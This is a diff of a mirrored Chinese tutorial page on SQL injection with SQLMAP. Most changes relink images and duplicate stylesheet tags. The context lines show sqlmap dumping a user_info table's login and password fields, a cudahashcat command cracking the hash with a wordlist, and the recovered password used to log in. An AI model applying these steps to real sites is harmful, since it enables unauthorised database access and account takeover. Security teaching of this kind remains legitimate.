@@ -3,7 +3,7 @@
 			<head>
 			     <title>使用SQLMAP对网站和数据库进行SQL注入攻击 - windhawk</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/2113">http://drops.wooyun.org/tips/2113</a></h1>
 				
@@ -852,7 +852,7 @@
 
 <p>下面是我自己测试时的SQL错误截图：</p>
 
-<p><img src="http://static.wooyun.org/201405/2014052914544392535.png" alt="2014052914544392535.png"> </p>
+<p><img src="../images_result/images/2014052914544392535.png" alt="2014052914544392535.png"> </p>
 
 <p>不同的数据库返回的SQL错误或许会有不同，比如：</p>
 
@@ -931,7 +931,7 @@ Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not pro
 [10:56:42] [INFO] retrieved: user_info
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201405/2014052914585030373.png" alt="2014052914585030373.png"> </p>
+<p><img src="../images_result/images/2014052914585030373.png" alt="2014052914585030373.png"> </p>
 
 <p>显而易见，我们的兴趣主要在表user_info中，因为这张表中包含着数据库的用户名和密码。</p>
 
@@ -961,7 +961,7 @@ Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not pro
 [10:57:43] [INFO] retrieved: tinyint(4)
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201405/2014052915004160941.png" alt="2014052915004160941.png"> </p>
+<p><img src="../images_result/images/2014052915004160941.png" alt="2014052915004160941.png"> </p>
 
 <p>哈哈！其中的<code>user_login</code>和<code>user_password</code>字段就是我们要找的！</p>
 
@@ -980,7 +980,7 @@ Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not pro
 [10:58:40] [INFO] analyzing table dump for possible password hashes
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201405/2014052915114612604.png" alt="2014052915114612604.png"></p>
+<p><img src="../images_result/images/2014052915114612604.png" alt="2014052915114612604.png"></p>
 
 <p>现在我们只需要这个用户的密码了，下面就来介绍如何得到密码！</p>
 
@@ -1008,7 +1008,7 @@ Table: user_info
 +---------------+
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201405/2014052915045923606.png" alt="2014052915045923606.png"></p>
+<p><img src="../images_result/images/2014052915045923606.png" alt="2014052915045923606.png"></p>
 
 <p>虽然我们得到了密码字段的值，但是却是密码的HASH值，现在我们需要解密这个密码了。我之前已经探讨过在Kali Linux上如何解密MD5、phpBB、MySQL和SHA-1。</p>
 
@@ -1032,7 +1032,7 @@ Table: user_info
 
 <p>然后根据提示提供HASH值就可以了：</p>
 
-<p><img src="http://static.wooyun.org/201405/2014052915061762603.png" alt="2014052915061762603.png"> </p>
+<p><img src="../images_result/images/2014052915061762603.png" alt="2014052915061762603.png"> </p>
 
 <p>所以这是一个DES(Unix) HASH。</p>
 
@@ -1047,7 +1047,7 @@ Table: user_info
 
 <p>【PS：这里的cudahashcat是借助GPU进行破解的工具，下面提到的oclHashcat也是同样的工具，详细介绍与用法可以参考HASHCAT使用简介传送门：<a href="http://drops.wooyun.org/tools/655">http://drops.wooyun.org/tools/655</a>】</p>
 
-<p><img src="http://static.wooyun.org/201405/2014052915070592604.png" alt="2014052915070592604.png"> </p>
+<p><img src="../images_result/images/2014052915070592604.png" alt="2014052915070592604.png"> </p>
 
 <p>如图所示：代码要么是1500要么是3100，因为目标是一个MySQL数据库，所以一定是1500.我运行的电脑使用的是NVDIA显卡，因此我可以使用cudaHashcat；我的笔记本是AMD显卡，那么我就只能使用oclHashcat破解MD5.如果你运行在VirtualBox或者VMWare上，你既不能使用cudahashcat也不能使用oclhashcat，你必须安装Kali Linux。</p>
 
@@ -1056,7 +1056,7 @@ Table: user_info
 <pre><code>cudahashcat -m 1500 -a 0 /root/sql/DES.hash /root/sql/rockyou.txt
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201405/2014052915081195605.png" alt="2014052915081195605.png"> </p>
+<p><img src="../images_result/images/2014052915081195605.png" alt="2014052915081195605.png"> </p>
 
 <p>现在我们得到了破解的密码：abc123，接下来我们就可以使用这个用户的身份登录了。</p>
 
